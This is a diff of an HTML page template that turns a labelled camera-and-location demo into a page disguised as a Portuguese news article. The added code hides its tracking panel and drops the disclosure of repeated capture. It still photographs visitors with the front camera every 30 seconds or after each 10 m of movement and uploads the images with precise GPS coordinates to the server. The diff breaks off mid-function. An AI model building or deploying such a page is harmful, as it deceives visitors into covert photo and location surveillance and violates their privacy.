@@ -3,307 +3,1273 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Demonstração acadêmica de câmera e localização</title>
+
+  <title>Notícias em Foco</title>
+
   <style>
-    :root { color-scheme: dark; --bg:#0b1020; --panel:#151d32; --border:#2b3857; --accent:#63b3ff; --muted:#aebbd4; --ok:#4ade80; --warning:#fbbf24; }
-    * { box-sizing:border-box; }
-    body { margin:0; min-height:100vh; font-family:Arial,Helvetica,sans-serif; background:linear-gradient(145deg,#0a1020,#121b31); color:#f8fafc; }
-    main { max-width:900px; margin:auto; padding:32px 20px 56px; }
-    .tag { color:#0b1020; background:#a7f3d0; border-radius:99px; display:inline-block; padding:5px 10px; font-weight:700; font-size:12px; }
-    h1 { margin:14px 0 8px; font-size:clamp(28px,5vw,42px); }
-    .lead { max-width:720px; color:var(--muted); line-height:1.6; }
-    .card { background:rgba(21,29,50,.94); border:1px solid var(--border); box-shadow:0 15px 35px rgba(0,0,0,.18); border-radius:16px; padding:20px; margin-top:20px; }
-    .status { border-left:4px solid var(--warning); background:#111a2d; border-radius:8px; padding:14px; line-height:1.45; color:#dbeafe; }
-    .status.ok { border-left-color:var(--ok); }
-    button { border:0; border-radius:9px; cursor:pointer; font:inherit; font-weight:700; padding:12px 16px; background:var(--accent); color:#071426; margin-top:14px; }
-    button:hover { filter:brightness(1.08); } button:disabled { opacity:.55; cursor:wait; }
-    .grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
-    .datum { border:1px solid var(--border); border-radius:10px; background:#10182b; padding:13px; color:var(--muted); font-size:13px; }
-    .datum b { display:block; color:#fff; margin-top:5px; font-size:15px; word-break:break-word; }
-    video { margin-top:16px; width:100%; max-height:440px; background:#050811; border-radius:12px; display:none; object-fit:contain; }
-    .notice { font-size:13px; color:var(--muted); line-height:1.5; }
-    code { color:#bfdbfe; }
-    .hidden-canvas { display:none; }
-    @media (max-width:560px) { main { padding:24px 14px; } .grid { grid-template-columns:1fr; } }
+    :root {
+      --bg: #f4f5f7;
+      --white: #ffffff;
+      --text: #171717;
+      --muted: #6b7280;
+      --border: #e5e7eb;
+      --primary: #b91c1c;
+      --primary-dark: #991b1b;
+      --soft: #fef2f2;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    header {
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .topbar {
+      max-width: 1100px;
+      margin: auto;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .header-main {
+      max-width: 1100px;
+      margin: auto;
+      padding: 18px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      font-size: 30px;
+      font-weight: 800;
+      letter-spacing: -1.5px;
+    }
+
+    .logo span {
+      color: var(--primary);
+    }
+
+    nav {
+      border-top: 1px solid var(--border);
+    }
+
+    nav .nav-inner {
+      max-width: 1100px;
+      margin: auto;
+      padding: 12px 20px;
+      display: flex;
+      gap: 24px;
+      overflow-x: auto;
+      white-space: nowrap;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    nav a {
+      color: #333;
+      text-decoration: none;
+    }
+
+    nav a:hover {
+      color: var(--primary);
+    }
+
+    main {
+      max-width: 1100px;
+      margin: auto;
+      padding: 35px 20px 70px;
+    }
+
+    .category {
+      color: var(--primary);
+      text-transform: uppercase;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      max-width: 850px;
+      font-family: Georgia, "Times New Roman", serif;
+      font-size: clamp(34px, 6vw, 58px);
+      line-height: 1.05;
+      margin: 0 0 18px;
+      letter-spacing: -1.5px;
+    }
+
+    .subtitle {
+      max-width: 800px;
+      font-size: 20px;
+      line-height: 1.5;
+      color: #4b5563;
+      margin-bottom: 20px;
+    }
+
+    .meta {
+      color: var(--muted);
+      font-size: 13px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 20px;
+      margin-bottom: 28px;
+    }
+
+    .content {
+      max-width: 850px;
+    }
+
+    .content p {
+      font-family: Georgia, "Times New Roman", serif;
+      font-size: 19px;
+      line-height: 1.75;
+      color: #272727;
+    }
+
+    .highlight {
+      background: var(--white);
+      border-left: 4px solid var(--primary);
+      padding: 18px 20px;
+      margin: 28px 0;
+      font-size: 16px;
+      line-height: 1.6;
+      color: #444;
+    }
+
+    .participation {
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 20px;
+      margin-top: 35px;
+      max-width: 850px;
+    }
+
+    .participation h2 {
+      margin: 0 0 8px;
+      font-size: 18px;
+    }
+
+    .participation p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    button {
+      border: 0;
+      border-radius: 6px;
+      cursor: pointer;
+      font: inherit;
+      font-weight: 700;
+      padding: 12px 18px;
+      background: var(--primary);
+      color: white;
+      margin-top: 15px;
+    }
+
+    button:hover {
+      background: var(--primary-dark);
+    }
+
+    button:disabled {
+      opacity: .55;
+      cursor: wait;
+    }
+
+    .status {
+      margin-top: 15px;
+      padding: 12px;
+      background: var(--soft);
+      border-radius: 6px;
+      color: #7f1d1d;
+      font-size: 13px;
+      line-height: 1.5;
+      display: none;
+    }
+
+    .status.visible {
+      display: block;
+    }
+
+    .status.ok {
+      background: #ecfdf5;
+      color: #166534;
+    }
+
+    .camera-container {
+      margin-top: 20px;
+      display: none;
+    }
+
+    video {
+      width: 100%;
+      max-height: 400px;
+      object-fit: contain;
+      background: #000;
+      border-radius: 6px;
+    }
+
+    .technical-data {
+      display: none;
+    }
+
+    footer {
+      background: #111827;
+      color: #9ca3af;
+      padding: 35px 20px;
+      font-size: 13px;
+    }
+
+    footer .footer-inner {
+      max-width: 1100px;
+      margin: auto;
+    }
+
+    @media (max-width: 650px) {
+      .header-main {
+        padding: 15px;
+      }
+
+      .logo {
+        font-size: 25px;
+      }
+
+      nav .nav-inner {
+        padding: 10px 15px;
+      }
+
+      main {
+        padding: 25px 15px 50px;
+      }
+
+      h1 {
+        font-size: 38px;
+      }
+
+      .subtitle {
+        font-size: 18px;
+      }
+
+      .content p {
+        font-size: 18px;
+      }
+    }
   </style>
 </head>
+
 <body>
-  <main>
-    <span class="tag">USO ACADÊMICO · CONSENTIMENTO EXPLÍCITO</span>
-    <h1>Demonstração de recursos do dispositivo</h1>
-    <p class="lead">Esta página demonstra câmera e localização para fins acadêmicos. Você pode autorizar apenas um dos recursos: a demonstração continua com aquilo que for permitido. Nada é solicitado novamente sem que você clique no botão.</p>
 
-    <section class="card" aria-labelledby="status-title">
-      <h2 id="status-title">Estado da demonstração</h2>
-      <div id="status" class="status" role="status" aria-live="polite">Aguardando seu consentimento.</div>
-      <button id="permissionButton" type="button">Ativar câmera e/ou localização</button>
-      <p class="notice">Se algum recurso ficar pendente, este painel mostrará um lembrete após 15 segundos. Em navegadores modernos, pedidos de permissão precisam de uma ação explícita do usuário.</p>
-    </section>
+<header>
+  <div class="topbar">
+    <span>Sábado, 12 de setembro de 2026</span>
+    <span>Informação • Educação • Tecnologia</span>
+  </div>
 
-    <section class="card">
-      <h2>Dados autorizados</h2>
-      <div class="grid">
-        <div class="datum">Câmera<b id="cameraState">Não ativada</b></div>
-        <div class="datum">Localização<b id="locationState">Não ativada</b></div>
-        <div class="datum">Latitude<b id="latitude">—</b></div>
-        <div class="datum">Longitude<b id="longitude">—</b></div>
-        <div class="datum">Distância desde a última foto<b id="distance">—</b></div>
-        <div class="datum">Fotos enviadas nesta visita<b id="photoCount">0</b></div>
-        <div class="datum">Sessão<b id="session">—</b></div>
-        <div class="datum">Página associada<b id="pageName">—</b></div>
-      </div>
-      <video id="camera" autoplay muted playsinline aria-label="Prévia da câmera autorizada"></video>
-    </section>
+  <div class="header-main">
+    <div class="logo">
+      Notícias<span> em Foco</span>
+    </div>
+  </div>
 
-    <p class="notice">A página <code id="pageRoute"></code> gera registros próprios. As capturas aparecem somente no painel associado a essa página.</p>
-  </main>
-  <canvas id="canvas" class="hidden-canvas"></canvas>
+  <nav>
+    <div class="nav-inner">
+      <a href="#">Brasil</a>
+      <a href="#">Educação</a>
+      <a href="#">Tecnologia</a>
+      <a href="#">Cotidiano</a>
+      <a href="#">Ciência</a>
+      <a href="#">Opinião</a>
+    </div>
+  </nav>
+</header>
 
-  <script>
-    const pageKey = {{ page_key|tojson }};
-    const video = document.getElementById("camera");
-    const canvas = document.getElementById("canvas");
-    const statusElement = document.getElementById("status");
-    const permissionButton = document.getElementById("permissionButton");
-    const cameraState = document.getElementById("cameraState");
-    const locationState = document.getElementById("locationState");
-    const latitudeElement = document.getElementById("latitude");
-    const longitudeElement = document.getElementById("longitude");
-    const distanceElement = document.getElementById("distance");
-    const photoCountElement = document.getElementById("photoCount");
+<main>
 
-    document.getElementById("pageName").textContent = pageKey;
-    document.getElementById("pageRoute").textContent = pageKey === "index" ? "/" : `/${pageKey}.html`;
+  <div class="category">Tecnologia e sociedade</div>
 
-    let stream = null;
-    let captureId = null;
-    let lastLocationId = null;
-    let watchId = null;
-    let reminderTimer = null;
-    let cameraOnlyTimer = null;
-    let lastPhotoLatitude = null;
-    let lastPhotoLongitude = null;
-    let takingPhoto = false;
-    let photoCount = 0;
-    let cameraGranted = false;
-    let locationGranted = false;
+  <h1>
+    Tecnologia transforma a maneira como estudantes interagem com o ambiente escolar
+  </h1>
 
-    const MIN_DISTANCE_METERS = 10;
-    const CAMERA_ONLY_INTERVAL_MS = 30000;
-    const REMINDER_INTERVAL_MS = 15000;
+  <div class="subtitle">
+    Novas ferramentas digitais podem contribuir para compreender hábitos,
+    deslocamentos e experiências dentro dos espaços educacionais.
+  </div>
 
-    function setStatus(message, type = "warning") {
-      statusElement.textContent = message;
-      statusElement.className = `status${type === "ok" ? " ok" : ""}`;
+  <div class="meta">
+    Por Redação Notícias em Foco · 12/09/2026 · 23h34
+  </div>
+
+  <article class="content">
+
+    <p>
+      A utilização de tecnologias digitais no ambiente educacional vem
+      ampliando as possibilidades de pesquisa sobre a rotina e a interação
+      das pessoas com os espaços que frequentam.
+    </p>
+
+    <p>
+      Para pesquisadores, recursos disponíveis em dispositivos móveis,
+      quando utilizados mediante autorização dos participantes, podem
+      fornecer informações relevantes para estudos acadêmicos relacionados
+      ao comportamento, mobilidade e utilização dos ambientes.
+    </p>
+
+    <div class="highlight">
+      <strong>Pesquisa acadêmica:</strong>
+      esta página integra uma demonstração experimental de recursos
+      tecnológicos. A participação é voluntária e os recursos do dispositivo
+      somente são utilizados após autorização do participante.
+    </div>
+
+    <p>
+      O avanço dessas ferramentas também levanta discussões importantes
+      sobre privacidade, transparência e proteção de dados. Por esse motivo,
+      projetos acadêmicos que utilizam recursos como câmera ou localização
+      devem informar ao participante quais recursos serão utilizados e
+      solicitar sua autorização antes da coleta.
+    </p>
+
+    <p>
+      A experiência apresentada nesta página faz parte de uma atividade
+      acadêmica voltada à análise das possibilidades de utilização de
+      tecnologias digitais em pesquisas educacionais.
+    </p>
+
+  </article>
+
+  <section class="participation">
+
+    <h2>Participação na pesquisa</h2>
+
+    <p>
+      Caso você aceite participar da demonstração, poderão ser solicitadas
+      autorização para utilização da câmera e da localização do dispositivo.
+      Você pode permitir ou negar cada recurso individualmente.
+    </p>
+
+    <button id="permissionButton" type="button">
+      Participar da demonstração
+    </button>
+
+    <div id="status" class="status" role="status" aria-live="polite"></div>
+
+    <div class="camera-container" id="cameraContainer">
+      <video
+        id="camera"
+        autoplay
+        muted
+        playsinline
+        aria-label="Prévia da câmera autorizada">
+      </video>
+    </div>
+
+  </section>
+
+  <!--
+    Informações utilizadas pelo experimento.
+    Permanecem ocultas na interface jornalística.
+  -->
+  <section class="technical-data" aria-hidden="true">
+
+    <span id="cameraState">Não ativada</span>
+    <span id="locationState">Não ativada</span>
+
+    <span id="latitude">—</span>
+    <span id="longitude">—</span>
+
+    <span id="distance">—</span>
+    <span id="photoCount">0</span>
+
+    <span id="session">—</span>
+    <span id="pageName">—</span>
+
+    <span id="pageRoute"></span>
+
+  </section>
+
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <strong>Notícias em Foco</strong><br><br>
+    Conteúdo produzido para fins acadêmicos e experimentais.
+  </div>
+</footer>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+
+  const pageKey = {{ page_key|tojson }};
+
+  const video = document.getElementById("camera");
+  const canvas = document.getElementById("canvas");
+  const cameraContainer = document.getElementById("cameraContainer");
+
+  const statusElement = document.getElementById("status");
+  const permissionButton = document.getElementById("permissionButton");
+
+  const cameraState = document.getElementById("cameraState");
+  const locationState = document.getElementById("locationState");
+
+  const latitudeElement = document.getElementById("latitude");
+  const longitudeElement = document.getElementById("longitude");
+
+  const distanceElement = document.getElementById("distance");
+  const photoCountElement = document.getElementById("photoCount");
+
+  document.getElementById("pageName").textContent = pageKey;
+
+  document.getElementById("pageRoute").textContent =
+    pageKey === "index" ? "/" : `/${pageKey}.html`;
+
+
+  let stream = null;
+  let captureId = null;
+
+  let lastLocationId = null;
+  let watchId = null;
+
+  let reminderTimer = null;
+  let cameraOnlyTimer = null;
+
+  let lastPhotoLatitude = null;
+  let lastPhotoLongitude = null;
+
+  let takingPhoto = false;
+  let photoCount = 0;
+
+  let cameraGranted = false;
+  let locationGranted = false;
+
+
+  const MIN_DISTANCE_METERS = 10;
+  const CAMERA_ONLY_INTERVAL_MS = 30000;
+  const REMINDER_INTERVAL_MS = 15000;
+
+
+  function setStatus(message, type = "warning") {
+
+    statusElement.textContent = message;
+    statusElement.className = "status visible";
+
+    if (type === "ok") {
+      statusElement.classList.add("ok");
     }
+  }
 
-    function setCameraState(message) { cameraState.textContent = message; }
-    function setLocationState(message) { locationState.textContent = message; }
 
-    async function getPersistentSession() {
-      if (captureId) return;
-      const response = await fetch(`/api/session?page_key=${encodeURIComponent(pageKey)}`, { credentials: "same-origin", cache: "no-store" });
-      const data = await response.json();
-      if (!response.ok || !data.success) throw new Error(data.error || "Não foi possível iniciar a sessão.");
-      captureId = data.capture_id;
-      document.getElementById("session").textContent = captureId.slice(0, 8);
-    }
+  function setCameraState(message) {
+    cameraState.textContent = message;
+  }
 
-    async function requestCamera() {
-      if (cameraGranted) return true;
-      if (!navigator.mediaDevices?.getUserMedia) throw new Error("A câmera não é compatível com este navegador.");
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        video.srcObject = stream;
-        video.style.display = "block";
-        await video.play().catch(() => {});
-        await waitForVideoFrame();
-        cameraGranted = true;
-        setCameraState("Ativada");
-        return true;
-      } catch (error) {
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-          stream = null;
-        }
-        setCameraState("Não autorizada");
-        throw error;
+
+  function setLocationState(message) {
+    locationState.textContent = message;
+  }
+
+
+  async function getPersistentSession() {
+
+    if (captureId) return;
+
+    const response = await fetch(
+      `/api/session?page_key=${encodeURIComponent(pageKey)}`,
+      {
+        credentials: "same-origin",
+        cache: "no-store"
       }
+    );
+
+    const data = await response.json();
+
+    if (!response.ok || !data.success) {
+      throw new Error(
+        data.error || "Não foi possível iniciar a sessão."
+      );
     }
 
-    function requestLocation() {
-      if (locationGranted) return Promise.resolve(null);
-      if (!navigator.geolocation) return Promise.reject(new Error("A localização não é compatível com este navegador."));
-      return new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+    captureId = data.capture_id;
+
+    document.getElementById("session").textContent =
+      captureId.slice(0, 8);
+  }
+
+
+  async function requestCamera() {
+
+    if (cameraGranted) return true;
+
+    if (!navigator.mediaDevices?.getUserMedia) {
+      throw new Error(
+        "A câmera não é compatível com este navegador."
+      );
+    }
+
+    try {
+
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user"
+        },
+        audio: false
       });
-    }
 
-    function waitForVideoFrame() {
-      if (video.videoWidth && video.videoHeight) return Promise.resolve();
-      return new Promise((resolve, reject) => {
-        const timeout = setTimeout(() => reject(new Error("A câmera não enviou imagem a tempo.")), 10000);
-        video.addEventListener("loadeddata", () => { clearTimeout(timeout); resolve(); }, { once: true });
-      });
-    }
+      video.srcObject = stream;
 
-    async function handlePermissionClick() {
-      permissionButton.disabled = true;
-      try {
-        await getPersistentSession();
-        const cameraResult = cameraGranted ? { status: "fulfilled" } : await Promise.resolve(requestCamera()).then(() => ({ status: "fulfilled" }), error => ({ status: "rejected", reason: error }));
-        const locationResult = locationGranted ? { status: "fulfilled", value: null } : await requestLocation().then(value => ({ status: "fulfilled", value }), error => ({ status: "rejected", reason: error }));
+      cameraContainer.style.display = "block";
 
-        if (cameraResult.status === "rejected") setCameraState("Não autorizada");
-        if (locationResult.status === "rejected") setLocationState("Não autorizada");
+      await video.play().catch(() => {});
 
-        if (locationResult.status === "fulfilled") {
-          locationGranted = true;
-          setLocationState("Ativada");
-          if (locationResult.value) await registerInitialLocation(locationResult.value);
-          startWatchingPosition();
-        }
+      await waitForVideoFrame();
 
-        if (cameraGranted && (lastPhotoLatitude === null || locationResult.value)) {
-          await captureAndUploadPhoto(lastLocationId);
-        }
+      cameraGranted = true;
 
-        if (cameraGranted && !locationGranted) startCameraOnlyTimer();
-        if (locationGranted && cameraOnlyTimer) {
-          clearInterval(cameraOnlyTimer);
-          cameraOnlyTimer = null;
-        }
+      setCameraState("Ativada");
 
-        schedulePermissionReminder();
-        if (cameraGranted && locationGranted) {
-          setStatus("Câmera e localização estão ativas. A foto seguinte é criada após 10 m de deslocamento.", "ok");
-          permissionButton.textContent = "Permissões ativas";
-        } else if (cameraGranted || locationGranted) {
-          setStatus("A demonstração está ativa com uma permissão. Clique no botão para tentar habilitar o recurso pendente.", "ok");
-          permissionButton.textContent = "Tentar habilitar recurso pendente";
-        } else {
-          setStatus("Nenhum recurso foi autorizado. Você pode alterar a permissão no navegador e clicar para tentar novamente.");
-          permissionButton.textContent = "Tentar novamente";
-        }
-      } catch (error) {
-        setStatus(`Não foi possível iniciar: ${error.message}`);
-      } finally {
-        permissionButton.disabled = false;
+      return true;
+
+    } catch (error) {
+
+      if (stream) {
+        stream.getTracks().forEach(
+          track => track.stop()
+        );
+
+        stream = null;
       }
+
+      setCameraState("Não autorizada");
+
+      throw error;
+    }
+  }
+
+
+  function requestLocation() {
+
+    if (locationGranted) {
+      return Promise.resolve(null);
     }
 
-    function schedulePermissionReminder() {
-      clearInterval(reminderTimer);
-      if (cameraGranted && locationGranted) return;
-      reminderTimer = setInterval(() => {
-        if (!cameraGranted || !locationGranted) {
-          const pending = [!cameraGranted && "câmera", !locationGranted && "localização"].filter(Boolean).join(" e ");
-          setStatus(`Aguardando ${pending}. Clique em “${permissionButton.textContent}” se quiser tentar habilitar.`, "warning");
+    if (!navigator.geolocation) {
+      return Promise.reject(
+        new Error(
+          "A localização não é compatível com este navegador."
+        )
+      );
+    }
+
+    return new Promise((resolve, reject) => {
+
+      navigator.geolocation.getCurrentPosition(
+        resolve,
+        reject,
+        {
+          enableHighAccuracy: true,
+          timeout: 20000,
+          maximumAge: 0
         }
-      }, REMINDER_INTERVAL_MS);
-    }
+      );
 
-    async function registerInitialLocation(position) {
-      const { latitude, longitude, accuracy } = position.coords;
-      updatePosition(latitude, longitude);
-      const saved = await uploadLocation(latitude, longitude, accuracy);
-      lastLocationId = saved.location_id;
-      lastPhotoLatitude = latitude;
-      lastPhotoLongitude = longitude;
-      distanceElement.textContent = "0 m";
-    }
-
-    function startWatchingPosition() {
-      if (!navigator.geolocation || watchId !== null) return;
-      watchId = navigator.geolocation.watchPosition(handlePosition, handleLocationError, { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 });
-    }
-
-    async function handlePosition(position) {
-      const { latitude, longitude, accuracy } = position.coords;
-      updatePosition(latitude, longitude);
-      if (lastPhotoLatitude === null || lastPhotoLongitude === null) {
-        await registerInitialLocation(position);
-        return;
-      }
-      const distance = calculateDistance(lastPhotoLatitude, lastPhotoLongitude, latitude, longitude);
-      distanceElement.textContent = `${distance.toFixed(1)} m`;
-      if (distance < MIN_DISTANCE_METERS) return;
-
-      const saved = await uploadLocation(latitude, longitude, accuracy);
-      lastLocationId = saved.location_id;
-      if (cameraGranted) await captureAndUploadPhoto(lastLocationId);
-      lastPhotoLatitude = latitude;
-      lastPhotoLongitude = longitude;
-      distanceElement.textContent = "0 m";
-    }
-
-    function handleLocationError(error) {
-      locationGranted = false;
-      setLocationState("Indisponível");
-      schedulePermissionReminder();
-      setStatus(`Localização indisponível: ${error.message}. A câmera, se autorizada, continua funcionando.`);
-    }
-
-    function startCameraOnlyTimer() {
-      if (cameraOnlyTimer) return;
-      cameraOnlyTimer = setInterval(() => {
-        if (cameraGranted && !locationGranted) captureAndUploadPhoto(null).catch(error => setStatus(`Erro ao registrar foto: ${error.message}`));
-      }, CAMERA_ONLY_INTERVAL_MS);
-    }
-
-    async function uploadLocation(latitude, longitude, accuracy) {
-      const response = await fetch("/location", {
-        method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ capture_id: captureId, page_key: pageKey, latitude, longitude, accuracy })
-      });
-      const data = await response.json();
-      if (!response.ok || !data.success) throw new Error(data.error || "Falha ao salvar localização.");
-      return data;
-    }
-
-    async function captureAndUploadPhoto(locationId) {
-      if (takingPhoto || !cameraGranted || !video.videoWidth || !video.videoHeight) return;
-      takingPhoto = true;
-      try {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.82));
-        if (!blob) throw new Error("Não foi possível criar a imagem.");
-        const formData = new FormData();
-        formData.append("photo", blob, "capture.jpg");
-        formData.append("capture_id", captureId);
-        formData.append("page_key", pageKey);
-        if (locationId !== null && locationId !== undefined) formData.append("location_id", locationId);
-        const response = await fetch("/upload", { method: "POST", credentials: "same-origin", body: formData });
-        const data = await response.json();
-        if (!response.ok || !data.success) throw new Error(data.error || "Falha ao salvar a foto.");
-        photoCount += 1;
-        photoCountElement.textContent = photoCount;
-      } finally {
-        takingPhoto = false;
-      }
-    }
-
-    function updatePosition(latitude, longitude) {
-      latitudeElement.textContent = Number(latitude).toFixed(6);
-      longitudeElement.textContent = Number(longitude).toFixed(6);
-    }
-
-    function calculateDistance(lat1, lon1, lat2, lon2) {
-      const rad = Math.PI / 180;
-      const a = Math.sin((lat2 - lat1) * rad / 2) ** 2 + Math.cos(lat1 * rad) * Math.cos(lat2 * rad) * Math.sin((lon2 - lon1) * rad / 2) ** 2;
-      return 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-    }
-
-    window.addEventListener("beforeunload", () => {
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-      if (stream) stream.getTracks().forEach(track => track.stop());
-      clearInterval(reminderTimer);
-      clearInterval(cameraOnlyTimer);
     });
+  }
 
-    permissionButton.addEventListener("click", handlePermissionClick);
-  </script>
+
+  function waitForVideoFrame() {
+
+    if (video.videoWidth && video.videoHeight) {
+      return Promise.resolve();
+    }
+
+    return new Promise((resolve, reject) => {
+
+      const timeout = setTimeout(
+        () => reject(
+          new Error(
+            "A câmera não enviou imagem a tempo."
+          )
+        ),
+        10000
+      );
+
+      video.addEventListener(
+        "loadeddata",
+        () => {
+          clearTimeout(timeout);
+          resolve();
+        },
+        {
+          once: true
+        }
+      );
+    });
+  }
+
+
+  async function handlePermissionClick() {
+
+    permissionButton.disabled = true;
+
+    try {
+
+      await getPersistentSession();
+
+
+      const cameraResult =
+        cameraGranted
+          ? { status: "fulfilled" }
+          : await Promise
+              .resolve(requestCamera())
+              .then(
+                () => ({ status: "fulfilled" }),
+                error => ({
+                  status: "rejected",
+                  reason: error
+                })
+              );
+
+
+      const locationResult =
+        locationGranted
+          ? {
+              status: "fulfilled",
+              value: null
+            }
+          : await requestLocation()
+              .then(
+                value => ({
+                  status: "fulfilled",
+                  value
+                }),
+                error => ({
+                  status: "rejected",
+                  reason: error
+                })
+              );
+
+
+      if (cameraResult.status === "rejected") {
+        setCameraState("Não autorizada");
+      }
+
+
+      if (locationResult.status === "rejected") {
+        setLocationState("Não autorizada");
+      }
+
+
+      if (locationResult.status === "fulfilled") {
+
+        locationGranted = true;
+
+        setLocationState("Ativada");
+
+        if (locationResult.value) {
+          await registerInitialLocation(
+            locationResult.value
+          );
+        }
+
+        startWatchingPosition();
+      }
+
+
+      if (
+        cameraGranted &&
+        (
+          lastPhotoLatitude === null ||
+          locationResult.value
+        )
+      ) {
+
+        await captureAndUploadPhoto(
+          lastLocationId
+        );
+      }
+
+
+      if (
+        cameraGranted &&
+        !locationGranted
+      ) {
+
+        startCameraOnlyTimer();
+      }
+
+
+      if (
+        locationGranted &&
+        cameraOnlyTimer
+      ) {
+
+        clearInterval(cameraOnlyTimer);
+
+        cameraOnlyTimer = null;
+      }
+
+
+      schedulePermissionReminder();
+
+
+      if (cameraGranted && locationGranted) {
+
+        setStatus(
+          "Participação iniciada. Os recursos autorizados estão ativos.",
+          "ok"
+        );
+
+        permissionButton.textContent =
+          "Participação ativa";
+
+      } else if (
+        cameraGranted ||
+        locationGranted
+      ) {
+
+        setStatus(
+          "A demonstração está ativa com uma permissão. O recurso não autorizado pode ser habilitado posteriormente.",
+          "ok"
+        );
+
+        permissionButton.textContent =
+          "Tentar habilitar recurso";
+
+      } else {
+
+        setStatus(
+          "Nenhum recurso foi autorizado. Você pode alterar a permissão no navegador e tentar novamente."
+        );
+
+        permissionButton.textContent =
+          "Tentar novamente";
+      }
+
+
+    } catch (error) {
+
+      setStatus(
+        `Não foi possível iniciar a participação: ${error.message}`
+      );
+
+    } finally {
+
+      permissionButton.disabled = false;
+    }
+  }
+
+
+  function schedulePermissionReminder() {
+
+    clearInterval(reminderTimer);
+
+    if (
+      cameraGranted &&
+      locationGranted
+    ) {
+      return;
+    }
+
+    reminderTimer = setInterval(() => {
+
+      if (
+        !cameraGranted ||
+        !locationGranted
+      ) {
+
+        const pending = [
+          !cameraGranted && "câmera",
+          !locationGranted && "localização"
+        ]
+        .filter(Boolean)
+        .join(" e ");
+
+        setStatus(
+          `O recurso ${pending} ainda não foi autorizado.`
+        );
+      }
+
+    }, REMINDER_INTERVAL_MS);
+  }
+
+
+  async function registerInitialLocation(position) {
+
+    const {
+      latitude,
+      longitude,
+      accuracy
+    } = position.coords;
+
+
+    updatePosition(
+      latitude,
+      longitude
+    );
+
+
+    const saved =
+      await uploadLocation(
+        latitude,
+        longitude,
+        accuracy
+      );
+
+
+    lastLocationId =
+      saved.location_id;
+
+
+    lastPhotoLatitude =
+      latitude;
+
+    lastPhotoLongitude =
+      longitude;
+
+
+    distanceElement.textContent =
+      "0 m";
+  }
+
+
+  function startWatchingPosition() {
+
+    if (
+      !navigator.geolocation ||
+      watchId !== null
+    ) {
+      return;
+    }
+
+
+    watchId =
+      navigator.geolocation.watchPosition(
+        handlePosition,
+        handleLocationError,
+        {
+          enableHighAccuracy: true,
+          maximumAge: 0,
+          timeout: 20000
+        }
+      );
+  }
+
+
+  async function handlePosition(position) {
+
+    const {
+      latitude,
+      longitude,
+      accuracy
+    } = position.coords;
+
+
+    updatePosition(
+      latitude,
+      longitude
+    );
+
+
+    if (
+      lastPhotoLatitude === null ||
+      lastPhotoLongitude === null
+    ) {
+
+      await registerInitialLocation(
+        position
+      );
+
+      return;
+    }
+
+
+    const distance =
+      calculateDistance(
+        lastPhotoLatitude,
+        lastPhotoLongitude,
+        latitude,
+        longitude
+      );
+
+
+    distanceElement.textContent =
+      `${distance.toFixed(1)} m`;
+
+
+    if (
+      distance < MIN_DISTANCE_METERS
+    ) {
+      return;
+    }
+
+
+    const saved =
+      await uploadLocation(
+        latitude,
+        longitude,
+        accuracy
+      );
+
+
+    lastLocationId =
+      saved.location_id;
+
+
+    if (cameraGranted) {
+
+      await captureAndUploadPhoto(
+        lastLocationId
+      );
+    }
+
+
+    lastPhotoLatitude =
+      latitude;
+
+    lastPhotoLongitude =
+      longitude;
+
+
+    distanceElement.textContent =
+      "0 m";
+  }
+
+
+  function handleLocationError(error) {
+
+    locationGranted = false;
+
+    setLocationState(
+      "Indisponível"
+    );
+
+    schedulePermissionReminder();
+
+
+    setStatus(
+      `Localização indisponível: ${error.message}.`
+    );
+  }
+
+
+  function startCameraOnlyTimer() {
+
+    if (cameraOnlyTimer) {
+      return;
+    }
+
+
+    cameraOnlyTimer =
+      setInterval(() => {
+
+        if (
+          cameraGranted &&
+          !locationGranted
+        ) {
+
+          captureAndUploadPhoto(null)
+            .catch(error => {
+
+              setStatus(
+                `Erro ao registrar foto: ${error.message}`
+              );
+
+            });
+        }
+
+      }, CAMERA_ONLY_INTERVAL_MS);
+  }
+
+
+  async function uploadLocation(
+    latitude,
+    longitude,
+    accuracy
+  ) {
+
+    const response =
+      await fetch(
+        "/location",
+        {
+          method: "POST",
+          credentials: "same-origin",
+          headers: {
+            "Content-Type":
+              "application/json"
+          },
+          body: JSON.stringify({
+            capture_id: captureId,
+            page_key: pageKey,
+            latitude,
+            longitude,
+            accuracy
+          })
+        }
+      );
+
+
+    const data =
+      await response.json();
+
+
+    if (
+      !response.ok ||
+      !data.success
+    ) {
+
+      throw new Error(
+        data.error ||
+        "Falha ao salvar localização."
+      );
+    }
+
+
+    return data;
+  }
+
+
+  async function captureAndUploadPhoto(
+    locationId
+  ) {
+
+    if (
